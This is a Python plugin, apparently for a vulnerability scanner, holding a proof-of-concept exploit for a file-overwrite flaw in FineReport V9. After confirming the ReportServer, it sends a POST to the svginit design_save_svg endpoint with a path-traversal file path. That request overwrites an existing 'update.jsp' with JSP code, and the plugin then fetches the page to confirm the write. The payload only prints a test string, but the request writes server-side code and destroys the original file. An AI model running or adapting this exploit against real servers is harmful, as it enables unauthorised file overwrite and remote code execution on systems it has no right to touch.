from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "帆软 FineReport V9 svginit 文件覆盖漏洞"
        self.app_name = 'FineReport'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        path = "/WebReport/ReportServer?op=resource&resource=/com/fr/web/jquery.js"

        #只能覆盖已经存在了的文件
        upload_file_path = "update.jsp"

        url = target + path
        conn = http_req(url)
        if b'jQuery=' not in conn.content:
            self.logger.debug("not found WebReport/ReportServer {}".format(target))
            return

        upload_path = '/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/'
        url = target + upload_path + upload_file_path
        headers = {
            "Content-Type": "text/xml;charset=UTF-8"
        }
        data = '{"__CONTENT__":"<%out.println(\\"test 2022!\\");%>","__CHARSET__":"UTF-8"}'
        conn = http_req(url, method='post', headers=headers, data=data)
        # if b'<' in conn.content:
        #     self.logger.debug("upload file fail {}".format(target))
        #     return

        check_url = target + "/WebReport/" + upload_file_path
        if b'test 2022!' in http_req(check_url).content:
            self.logger.success("upload success {}".format(check_url))
            return check_url
        else:
            self.logger.debug("check url fail {}".format(check_url))
            return False



